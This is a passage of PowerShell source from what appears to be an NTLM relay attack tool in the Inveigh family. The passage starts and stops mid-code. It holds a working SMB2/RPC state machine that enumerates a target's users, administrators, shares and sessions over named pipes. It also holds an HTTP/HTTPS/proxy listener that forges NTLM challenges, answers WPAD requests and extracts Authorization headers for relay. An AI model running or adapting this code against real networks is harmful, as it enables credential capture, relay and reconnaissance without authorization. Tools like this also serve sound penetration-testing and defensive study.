                  }\n\n                            }\n\n                            'CreateRequest'\n                            {\n\n                                if($action_stage -eq 'Share')\n                                {\n                                    $frag_length = 0x48,0x00\n                                    $call_ID = 2\n                                    $num_ctx_items = 0x01\n                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88\n                                    $named_pipe_UUID_version = 0x03,0x00\n                                    $stage_next = 'NetShareEnumAll'\n                                }\n                                elseif($action_stage -eq 'NetSession')\n                                {\n                                    $frag_length = 0x74,0x00\n                                    $call_ID = 2\n                                    $num_ctx_items = 0x02\n                                    $named_pipe_UUID = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88\n                                    $named_pipe_UUID_version = 0x03,0x00\n                                    $stage_next = 'NetSessEnum'\n                                }\n                                elseif($step -eq 1)\n                                {\n                                    $frag_length = 0x48,0x00\n                                    $call_ID = 5\n                                    $num_ctx_items = 0x01\n                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac\n                                    $named_pipe_UUID_version = 0x01,0x00\n\n                                    if($action_stage -eq 'User')\n                                    {\n                                        $stage_next = 'Connect5'\n                                    }\n                                    else\n                                    {\n                                        $stage_next = 'Connect2'\n                                    }\n\n                                }\n                                elseif($step -gt 2)\n                                {\n                                    $frag_length = 0x48,0x00\n                                    $call_ID = 14\n                                    $num_ctx_items = 0x01\n                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab\n                                    $named_pipe_UUID_version = 0x00,0x00\n                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00\n                                    $stage_next = 'LSAOpenPolicy'\n                                }\n                                else\n                                {\n                                    $frag_length = 0x48,0x00\n                                    $call_ID = 1\n                                    $num_ctx_items = 0x01\n                                    $named_pipe_UUID = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab\n                                    $named_pipe_UUID_version = 0x00,0x00\n                                    $named_pipe = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00\n                                    $stage_next = 'LSAOpenPolicy'\n                                }\n\n                                $file_ID = $client_receive[132..147]\n                        \n                                if($Refresh -and $stage -ne 'Exit')\n                                {\n                                    Write-Output \"[+] Session refreshed\" # check\n                                    $stage = 'Exit'\n                                }\n                                elseif($step -ge 2)\n                                {\n                                    $stage = 'RPCBind'\n                                }\n                                elseif($stage -ne 'Exit')\n                                {\n                                    $stage = 'QueryInfoRequest'\n                                }\n\n                            }\n\n                            'EnumDomainUsers'\n                            {\n                                $step++\n                                $stage = 'ParseUsers'\n                            }\n\n                            'GetMembersInAlias'\n                            {\n                                $step++\n                                [Byte[]]$SID_array = $client_receive[140..([System.BitConverter]::ToInt16($client_receive[3..1],0) - 1)]\n                        \n                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')\n                                {\n                                    $stage = 'SAMRCloseRequest'\n                                }\n                                else\n                                {\n                                    $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc\n                                    $stage = 'CreateRequest'\n                                }\n\n                            }\n\n                            'Logoff'\n                            {\n                                $stage = 'Exit'\n                            }\n\n                            'LookupNames'\n                            {\n                                $step++\n                                [Byte[]]$SAMR_RID = $client_receive[152..155]\n                                \n                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')\n                                {\n                                    $stage = 'SAMRCloseRequest'\n                                }\n                                else\n                                {\n                                    \n                                    if($step -eq 4)\n                                    {\n                                        $stage = 'OpenGroup'\n                                    }\n                                    else\n                                    {\n                                        $stage = 'OpenAlias'\n                                    }\n\n                                }\n\n                            }\n\n                            'LookupRids'\n                            {\n                                $step++\n                                $stage = 'ParseLookupRids'\n                            }\n\n                            'LSAClose'\n                            {\n                                $stage = 'CloseRequest'\n                            }\n\n                            'LSALookupSids'\n                            {\n                                $stage = 'ParseLookupSids'\n                            }\n\n                            'LSAOpenPolicy'\n                            {\n                                [Byte[]]$policy_handle = $client_receive[140..159]\n\n                                if($step -gt 2)\n                                {\n                                    $stage = 'LSALookupSids'\n                                }\n                                else\n                                {\n                                    $stage = 'LSAQueryInfoPolicy'    \n                                }\n\n                            }\n\n                            'LSAQueryInfoPolicy'\n                            {\n                                [Byte[]]$LSA_domain_length_bytes = $client_receive[148..149]\n                                $LSA_domain_length = [System.BitConverter]::ToInt16($LSA_domain_length_bytes,0)\n                                [Byte[]]$LSA_domain_actual_count_bytes = $client_receive[168..171]\n                                $LSA_domain_actual_count = [System.BitConverter]::ToInt32($LSA_domain_actual_count_bytes,0)\n                                \n                                if($LSA_domain_actual_count % 2)\n                                {\n                                    $LSA_domain_length += 2\n                                }\n\n                                [Byte[]]$LSA_domain_SID = $client_receive[(176 + $LSA_domain_length)..(199 + $LSA_domain_length)]\n                                $stage = 'LSAClose'\n                            }\n\n                            'NetSessEnum'\n                            {\n\n                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00' -or [System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')\n                                {\n                                    $stage = 'CloseRequest'\n                                }\n                                else\n                                {\n                                    $stage = 'ParseSRVSVC'\n                                }\n\n                            }\n\n                            'NetShareEnumAll'\n                            {\n                                $stage = 'ParseSRVSVC'\n                            }\n\n                            'OpenAlias'\n                            {\n                                $step++\n                                [Byte[]]$SAMR_policy_handle = $client_receive[140..159]\n                        \n                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')\n                                {\n                                    $stage = 'SAMRCloseRequest'\n                                }\n                                else\n                                {\n                                    $stage = 'GetMembersInAlias'\n                                }\n\n                            }\n\n                            'OpenDomain'\n                            {\n                                $step++\n                                [Byte[]]$SAMR_domain_handle = $client_receive[140..159]\n\n                                if($action_stage -eq 'User')\n                                {\n                                    $stage = 'EnumDomainUsers'\n                                }\n                                else\n                                {\n                                    $stage = 'LookupNames'\n                                }\n\n                            }\n\n                            'OpenGroup'\n                            {\n                                $step++\n                                [Byte[]]$group_handle = $client_receive[140..159]\n                                $stage = 'QueryGroupMember'\n                            }\n\n                            'QueryGroupMember'\n                            {\n                                $step++\n                                [Byte[]]$RID_count_bytes = $client_receive[144..147]\n                                $RID_count = [System.BitConverter]::ToInt16($RID_count_bytes,0)\n                                [Byte[]]$RID_list = $client_receive[160..(159 + ($RID_count * 4))]\n                                $stage = 'LookupRids'\n                            }\n\n                            'QueryInfoRequest'\n                            {\n                                $file_ID = $client_receive[132..147]\n                                $stage = 'RPCBind'\n                            }\n\n                            'ReadRequest'\n                            {\n                                $stage = $stage_next\n                            }\n\n                            'RPCBind'\n                            {\n                                $stage = 'ReadRequest'\n                            }\n\n                            'SAMRCloseRequest'\n                            {\n                                $step++\n\n                                if($step -eq 8)\n                                {\n                                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $Group group not found\") > $null\n                                    $stage = 'TreeDisconnect'\n                                }\n                                else\n                                {\n\n                                    if($step -eq 5 -and $action_stage -eq 'Group')\n                                    {\n                                        $LSA_domain_SID = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00\n                                        $SID_count = 0x01,0x00,0x00,0x00\n                                    }\n\n                                    $stage = 'OpenDomain'\n                                }\n\n                            }\n\n                            'TreeConnect'\n                            {\n                                $tree_ID = $client_receive[40..43]\n                                $access_mask = $null\n\n                                if($client_receive[76] -eq 92)\n                                {\n                                    $tree_access_mask = 0x00,0x00,0x00,0x00\n                                }\n                                else\n                                {\n                                    $tree_access_mask = $client_receive[80..83]\n                                }\n\n                                if($share_list.Count -gt 0)\n                                {\n\n                                    if($client_receive[76] -ne 92)\n                                    {\n\n                                        foreach($byte in $tree_access_mask)\n                                        {\n                                            $access_mask = [System.Convert]::ToString($byte,2).PadLeft(8,'0') + $access_mask\n                                        }\n                                        \n                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_.\"Access Mask\" = $access_mask}\n                                        $stage = 'TreeDisconnect'\n                                    }\n                                    else\n                                    {\n                                        $access_mask = \"00000000000000000000000000000000\"\n                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_.\"Access Mask\" = $access_mask}\n                                        $stage = 'TreeConnect'\n                                        $j++\n                                    }\n\n                                }\n                                else\n                                {\n                                    \n                                    if($action_stage -eq 'Share' -or $action_stage -eq 'NetSession')\n                                    {\n                                        $named_pipe = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc\n                                    }\n                                    else\n                                    {\n                                        $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc\n                                    }\n\n                                    $tree_IPC = $tree_ID\n                                    $stage = 'CreateRequest'\n                                }\n\n                            }\n\n                            'TreeDisconnect'\n                            {\n\n                                if($Action -eq 'All')\n                                {\n\n                                    switch ($action_stage) \n                                    {\n\n                                        'group'\n                                        {\n\n                                            if($RPC_access_denied)\n                                            {\n                                                $action_stage = \"share\"\n                                            }\n                                            else\n                                            {\n                                                $action_stage = \"user\"\n                                                $step = 0\n                                            }\n\n                                            $stage = \"treeconnect\"\n                                        }\n\n                                        'user'\n                                        {\n                                            $action_stage = \"netsession\"\n                                            $stage = \"treeconnect\"\n                                        }\n\n                                        'netsession'\n                                        {\n                                            $action_stage = \"share\"\n                                            $stage = \"treeconnect\"\n                                        }\n\n                                        'share'\n                                        {\n\n                                            if($share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)\n                                            {\n                                                $stage = 'TreeConnect'\n                                                $j++\n                                            }\n                                            elseif($share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)\n                                            {\n                                                $tree_ID = $tree_IPC\n                                                $stage = 'TreeDisconnect'\n                                                $j++\n                                            }\n                                            else\n                                            {\n                                                \n                                                if($attack -contains 'session')\n                                                {\n                                                    $stage = 'Exit'\n                                                }\n                                                else\n                                                {\n                                                    $stage = 'Logoff'\n                                                }\n\n                                            }\n                                            \n                                        }\n\n                                    }\n\n                                }\n                                else\n                                {\n                                    \n                                    if($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)\n                                    {\n                                        $stage = 'TreeConnect'\n                                        $j++\n                                    }\n                                    elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)\n                                    {\n                                        $tree_ID = $tree_IPC\n                                        $stage = 'TreeDisconnect'\n                                        $j++\n                                    }\n                                    else\n                                    {\n                                    \n                                        if($inveigh_session -and !$Logoff)\n                                        {\n                                            $stage = 'Exit'\n                                        }\n                                        else\n                                        {\n                                            $stage = 'Logoff'\n                                        }\n\n                                    }\n\n                                }\n                                \n                            }\n\n                        }\n\n                    }\n\n                    'TreeConnect'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n\n                        if($share_list.Count -gt 0)\n                        {\n                            $path = \"\\\\\" + $Target + \"\\\" + $share_list[$j]\n                            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)\n                        }\n\n                        $packet_SMB_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2TreeConnectRequest $path_bytes\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'TreeDisconnect'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2TreeDisconnectRequest\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive'\n                    }\n\n                }\n        \n            }\n            catch\n            {\n                $error_message = $_.Exception.Message\n                $error_message = $error_message -replace \"`n\",\"\"\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current\") > $null\n                $stage = 'Exit'\n            }\n\n        }\n\n        For($i = 0;$i -lt $enumerate_group_user_list.Count;$i++)\n        {\n            $user_entry = $enumerate_group_user_list[$i]\n            $user_entry_split = $user_entry.Split(\"\\\")\n            $domain = $user_entry_split[0]\n            $username = $user_entry_split[1]\n\n            if($inveigh.domain_mapping_table.ContainsKey($domain))\n            {\n                $user_update = ($username + \"@\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n                $enumerate_group_user_list[$i] = $user_update\n            }\n\n        }\n\n        For($i = 0;$i -lt $enumerate_group_group_list.Count;$i++)\n        {\n            $group_entry = $enumerate_group_group_list[$i]\n            $group_entry_split = $group_entry.Split(\"\\\")\n            $domain = $group_entry_split[0]\n            $group = $group_entry_split[1]\n\n            if($inveigh.domain_mapping_table.ContainsKey($domain))\n            {\n                $group_update = ($group + \"@\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n                $enumerate_group_group_list[$i] = $group_update\n            }\n\n        }\n\n        $inveigh.session_message_ID_table[$inveigh.session_count] = $message_ID\n\n        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n        {\n\n            if($inveigh.enumerate[$i].IP -eq $target)\n            {\n                $target_index = $i\n                break\n            }\n\n        }\n\n        if($EnumerateGroup -eq 'Administrators')\n        {\n            $inveigh.enumerate[$target_index].\"Administrator Users\" = $enumerate_group_user_list\n            $inveigh.enumerate[$target_index].\"Administrator Groups\" = $enumerate_group_group_list\n        }\n\n        $inveigh.enumerate[$target_index].\"Local Users\" = $enumerate_user_list\n        $inveigh.enumerate[$target_index].Shares = $enumerate_share_list\n        $net_sessions_unique = @()\n\n        foreach($net_session_entry in $enumerate_netsession_list)\n        {\n\n            if($inveigh.enumerate[$target_index].NetSessions -notcontains $net_session_entry)\n            {\n                $net_sessions_unique += $net_session_entry\n            }\n\n            $net_session_IP = ($net_session_entry.Split(\"\\\"))[2]\n            $net_session_user = ($net_session_entry.Split(\"\\\"))[3]\n\n            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n            {\n\n                if($inveigh.enumerate[$i].IP -contains $net_session_IP)\n                {\n                    $net_session_index = $i\n                    break\n                }\n\n            }\n\n            if($net_session_index -and $inveigh.enumerate[$net_session_index].NetSessions -notcontains $net_session_user)\n            {\n                $inveigh.enumerate[$net_session_index].\"NetSessions Mapped\" += $net_session_user\n            }\n            else\n            {\n                $inveigh.enumerate.Add((New-RelayEnumObject -IP $net_session_IP -NetSessionsMapped $net_session_user)) > $null\n            }\n\n        }\n\n        $inveigh.enumerate[$target_index].NetSessions += $net_sessions_unique\n        \n        if(!$RPC_access_denied)\n        {\n            $inveigh.enumerate[$target_index].Enumerate = $(Get-Date -format s)\n        }\n\n    }\n\n}\n\n# HTTP/HTTPS/Proxy Server ScriptBlock\n$HTTP_scriptblock = \n{ \n    param ($Attack,$Challenge,$Command,$Enumerate,$EnumerateGroup,$FailedLoginThreshold,$HTTPIP,$HTTPPort,\n    $HTTPS_listener,$Proxy,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$RepeatEnumerate,\n    $RepeatExecute,$Service,$SMB_version,$SessionLimitPriv,$SessionLimitUnpriv,$SessionLimitShare,\n    $SessionPriority,$Target,$TargetMode,$TargetRefresh,$Username,$WPADAuth,$WPADAuthIgnore,$WPADResponse)\n\n    function Get-NTLMChallengeBase64\n    {\n        param ([String]$Challenge,[String]$ClientIPAddress,[Int]$ClientPort)\n\n        $HTTP_timestamp = Get-Date\n        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()\n        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))\n        $HTTP_timestamp = $HTTP_timestamp.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n\n        if($Challenge)\n        {\n            $HTTP_challenge = $Challenge\n            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')\n            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n        else\n        {\n            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object{\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ',''\n            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n\n        if(!$inveigh.HTTP_session_table.ContainsKey(\"$ClientIPAddress`:$ClientPort\"))\n        {\n            $inveigh.HTTP_session_table.Add(\"$ClientIPAddress`:$ClientPort\",$HTTP_challenge)\n        }\n        else\n        {\n            $inveigh.HTTP_session_table[\"$ClientIPAddress`:$ClientPort\"] = $HTTP_challenge\n        }\n\n        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)\n        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)\n        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)\n        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_computer_name)\n        $hostname_length = [System.BitConverter]::GetBytes($hostname_bytes.Length)[0,1]\n        $netBIOS_domain_length = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length)[0,1]\n        $DNS_domain_length = [System.BitConverter]::GetBytes($DNS_domain_bytes.Length)[0,1]\n        $DNS_hostname_length = [System.BitConverter]::GetBytes($DNS_hostname_bytes.Length)[0,1]\n        $target_length = [System.BitConverter]::GetBytes($hostname_bytes.Length + $netBIOS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_hostname_bytes.Length + 36)[0,1]\n        $target_offset = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length + 56)\n\n        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +\n                            $netBIOS_domain_length +\n                            $netBIOS_domain_length +\n                            0x38,0x00,0x00,0x00 +\n                            0x05,0x82,0x89,0xa2 +\n                            $HTTP_challenge_bytes +\n                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + \n                            $target_length +\n                            $target_length + \n                            $target_offset +\n                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +\n                            $netBIOS_domain_bytes +\n                            0x02,0x00 + \n                            $netBIOS_domain_length +\n                            $netBIOS_domain_bytes + \n                            0x01,0x00 +\n                            $hostname_length +\n                            $hostname_bytes +\n                            0x04,0x00 +\n                            $DNS_domain_length +\n                            $DNS_domain_bytes +\n                            0x03,0x00 +\n                            $DNS_hostname_length +\n                            $DNS_hostname_bytes +\n                            0x05,0x00 +\n                            $DNS_domain_length +\n                            $DNS_domain_bytes +\n                            0x07,0x00,0x08,0x00 +\n                            $HTTP_timestamp +\n                            0x00,0x00,0x00,0x00,0x0a,0x0a\n\n        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\n        $NTLM = 'NTLM ' + $NTLM_challenge_base64\n\n        return $NTLM\n    }\n\n    if($HTTPS_listener)\n    {\n        $HTTP_type = \"HTTPS\"\n    }\n    elseif($proxy_listener)\n    {\n        $HTTP_type = \"Proxy\"\n    }\n    else\n    {\n        $HTTP_type = \"HTTP\"\n    }\n\n    if($HTTPIP -ne '0.0.0.0')\n    {\n        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)\n        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)\n    }\n    else\n    {\n        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::any,$HTTPPort)\n    }\n\n    $HTTP_running = $true\n    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint\n    $process_ID_bytes = Get-ProcessIDArray\n    $relay_step = 0\n\n    if($proxy_listener)\n    {\n        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)\n        $HTTP_listener.Server.LingerState = $HTTP_linger\n    }\n\n    try\n    {\n        $HTTP_listener.Start()\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting $HTTP_type listener\")\n        $HTTP_running = $false\n\n        if($inveigh.file_output)\n        {\n            $inveigh.log_file_queue.Add(\"[-] [$(Get-Date -format s)] Error starting $HTTP_type listener\")\n        }\n\n        if($inveigh.log_output)\n        {\n            $inveigh.log.Add(\"[-] [$(Get-Date -format s)] Error starting $HTTP_type listener\")\n        }\n\n    }\n\n    :HTTP_listener_loop while($inveigh.relay_running -and $HTTP_running)\n    {\n        $TCP_request = $null\n        $TCP_request_bytes = New-Object System.Byte[] 4096\n        $HTTP_send = $true\n        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: text/html\")\n        $HTTP_header_cache_control = $null\n        $HTTP_header_authenticate = $null\n        $HTTP_header_authenticate_data = $null\n        $HTTP_message = ''\n        $HTTP_header_authorization = ''\n        $HTTP_header_host = $null\n        $HTTP_header_user_agent = $null\n        $HTTP_request_raw_URL = $null\n        $NTLM = \"NTLM\"\n        \n        if(!$HTTP_client.Connected -and $inveigh.relay_running)\n        {\n            $HTTP_client_close = $false\n            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)\n\n            do\n            {\n\n                if(!$inveigh.relay_running)\n                {\n                    break HTTP_listener_loop\n                }\n\n                Start-Sleep -m 10\n            }\n            until($HTTP_async.IsCompleted)\n\n            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)\n            $HTTP_client_handle_old = $HTTP_client.Client.Handle\n            \n            if($HTTPS_listener)\n            {\n                $HTTP_clear_stream = $HTTP_client.GetStream()\n                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)\n                $SSL_cert = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})\n                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)\n            }\n            else\n            {\n                $HTTP_stream = $HTTP_client.GetStream()\n            }\n            \n        }\n        \n        if($relay_step -gt 0)\n        {\n            $relay_reset++\n\n            if($relay_reset -gt 2)\n            {\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay attack resetting\") > $null\n                $relay_step = 0\n            }\n\n        }\n        else\n        {\n            $relay_reset = 0\n        }\n\n        if($HTTPS_listener)\n        {\n            [Byte[]]$SSL_request_bytes = $null\n\n            while($HTTP_clear_stream.DataAvailable)\n            {\n                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)\n                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]\n            }\n\n            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)\n        }\n        else\n        {\n            \n            while($HTTP_stream.DataAvailable)\n            {\n                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null\n            }\n\n            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)\n        }\n        \n        if($TCP_request -like \"47-45-54-20*\" -or $TCP_request -like \"48-45-41-44-20*\" -or $TCP_request -like \"4f-50-54-49-4f-4e-53-20*\" -or $TCP_request -like \"43-4f-4e-4e-45-43-54*\")\n        {\n            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf(\"-20-\") + 4,$TCP_request.Substring($TCP_request.IndexOf(\"-20-\") + 1).IndexOf(\"-20-\") - 3)\n            $HTTP_raw_URL = $HTTP_raw_URL.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)\n            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString\n            $HTTP_source_Port = $HTTP_client.Client.RemoteEndpoint.Port\n            $HTTP_connection_header_close = $true\n\n            if(($TCP_request).StartsWith(\"47-45-54-20\"))\n            {\n                $HTTP_method = \"GET\"\n            }\n            elseif(($TCP_request).StartsWith(\"48-45-41-44-20\"))\n            {\n                $HTTP_method = \"HEAD\"\n            }\n            elseif(($TCP_request).StartsWith(\"4f-50-54-49-4F-4E-53-20\"))\n            {\n                $HTTP_method = \"OPTIONS\"\n            }\n            elseif(($TCP_request).StartsWith(\"43-4F-4E-4E-45-43-54\"))\n            {\n                $HTTP_method = \"CONNECT\"\n            }\n\n            if($TCP_request -like \"*-48-6F-73-74-3A-20-*\")\n            {\n                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-48-6F-73-74-3A-20-\") + 19)\n                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_host_extract = $HTTP_header_host_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)\n            }\n\n            if($TCP_request -like \"*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*\")\n            {\n                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-55-73-65-72-2D-41-67-65-6E-74-3A-20-\") + 37)\n                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)\n            }\n\n            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)\n            {\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP\") > $null\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP\") > $null\n\n                if($HTTP_header_user_agent)\n                {\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent\") > $null\n                }\n\n                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))\n                {\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] - $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP\") > $null\n                }\n\n            }\n\n            if($TCP_request -like \"*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*\")\n            {\n                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-\") + 46)\n                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)\n            }\n\n            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (\n            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))\n            {\n                $HTTP_response_status_code = 0x32,0x30,0x30\n                $HTTP_response_phrase = 0x4f,0x4b\n                $HTTP_client_close = $true\n            }\n            else\n            {\n                \n                if($proxy_listener)\n                {\n                    $HTTP_response_status_code = 0x34,0x30,0x37\n                    $HTTP_header_authenticate = 